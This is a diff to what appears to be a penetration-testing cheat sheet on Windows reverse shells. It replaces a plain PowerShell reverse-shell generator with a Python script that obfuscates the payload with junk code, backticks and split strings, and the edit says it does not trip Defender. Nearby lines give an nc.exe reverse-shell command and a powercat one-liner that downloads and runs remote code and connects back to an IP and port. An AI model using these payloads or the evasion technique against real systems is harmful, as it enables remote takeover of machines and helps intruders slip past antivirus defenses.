@@ -79,32 +79,60 @@ perl -e 'exec "/bin/sh";'
 **Windows Reverse Shells**
 - Download/transfer netcat (nc.exe within `/usr/share/windows-resources/binaries/nc.exe`)
   - Then run `C:\Windows\Temp\nc.exe -e powershell.exe {IP} {port}` for a Powershell reverse shell
-- Can also just do it with powershell alone - use this python script to generate the payload:
+- Can also just do it with powershell alone - use this python script to generate the obfuscated payload (doesn't trip Defender, as of writing):
 
 ```py
-import base64
-import sys
-
-if len(sys.argv) < 3:
-  print('usage : %s ip port' % sys.argv[0])
-  sys.exit(0)
-
-payload="""
-$c = New-Object System.Net.Sockets.TCPClient('%s',%s);
-$s = $c.GetStream();[byte[]]$b = 0..65535|%%{0};
-while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
-    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
-    $sb = (iex $d 2>&1 | Out-String );
-    $sb = ([text.encoding]::ASCII).GetBytes($sb + 'ps> ');
-    $s.Write($sb,0,$sb.Length);
-    $s.Flush()
-};
-$c.Close()
-""" % (sys.argv[1], sys.argv[2])
-
-byte = payload.encode('utf-16-le')
-b64 = base64.b64encode(byte)
+import base64, sys, random, string
+if len(sys.argv) < 3: print('usage: %s ip port' % sys.argv[0]); sys.exit(0)
+ip, port = sys.argv[1], sys.argv[2]
+UNSAFE = set('ntrabfv0')
+rv = lambda: '$' + ''.join(random.choices(string.ascii_letters, k=random.randint(6,12)))
+rs = lambda: ''.join(random.choices(string.ascii_letters+string.digits, k=random.randint(8,20)))
+ri = lambda: str(random.randint(100,999999))
+def bt(cmd):
+    parts = cmd.split('-')
+    r = []
+    for p in parts:
+        sp = [i for i in range(1,len(p)) if p[i].lower() not in UNSAFE]
+        if sp: i = random.choice(sp); p = p[:i]+'`'+p[i:]
+        r.append(p)
+    return '-'.join(r)
+def ss(s):
+    m = random.randint(2,len(s)-2)
+    return "('%s'+'%s')" % (s[:m],s[m:])
+words = 'initialize setup config validate check process handler module service update refresh sync load parse format convert buffer cache registry session context dispatch render'.split()
+rc = lambda: '# %s %s %s' % (random.choice(words),random.choice(words),rs())
+junk_t = [lambda: '%s = %s'%(rv(),ri()), lambda: "%s = '%s'"%(rv(),rs()),
+           lambda: 'if ($false) { %s = %s }'%(rv(),ri()), rc,
+           lambda: 'function %s { return %s }'%(rs(),ri()),
+           lambda: '%s = [int](%s) + [int](%s)'%(rv(),ri(),ri())]
+jl = lambda n=None: '\n'.join(random.choice(junk_t)() for _ in range(n or random.randint(1,3)))
+vc,vs,vb,vr,vd,vx,ve,vt = rv(),rv(),rv(),rv(),rv(),rv(),rv(),rv()
+payload = f"""{jl(3)}
+{vt} = {ss('System.Net.Sockets.TCPClient')}
+{jl(2)}
+{vc} = {bt('New-Object')} {vt} ('{ip}',{port})
+{jl(1)}
+{vs} = {vc}.GetStream()
+[byte[]]{vb} = 0..65535|%{{0}}
+{jl(2)}
+while(({vr} = {vs}.Read({vb}, 0, {vb}.Length)) -ne 0){{
+    {rc()}
+    {ve} = {bt('New-Object')} -TypeName {ss('System.Text.ASCIIEncoding')}
+    {vd} = {ve}.GetString({vb},0, {vr})
+    {jl(1)}
+    {vx} = (& ([scriptblock]::Create({vd})) 2>&1 | {bt('Out-String')} )
+    {vx} = ([text.encoding]::ASCII).GetBytes({vx} + 'ps> ')
+    {vs}.Write({vx},0,{vx}.Length)
+    {vs}.Flush()
+    {jl(1)}
+}}
+{jl(2)}
+{vc}.Close()
+"""
+b64 = base64.b64encode(payload.encode('utf-16-le'))
 print("powershell -exec bypass -enc %s" % b64.decode())
+
 ```
 
 - Run [powercat](https://github.com/besimorhino/powercat/blob/master/powercat.ps1) - `IEX(New-Object System.Net.WebClient).DownloadString('http://{IP}:{port}/powercat.ps1');powercat -c 192.168.45.220 -p 4444 -e powershell`
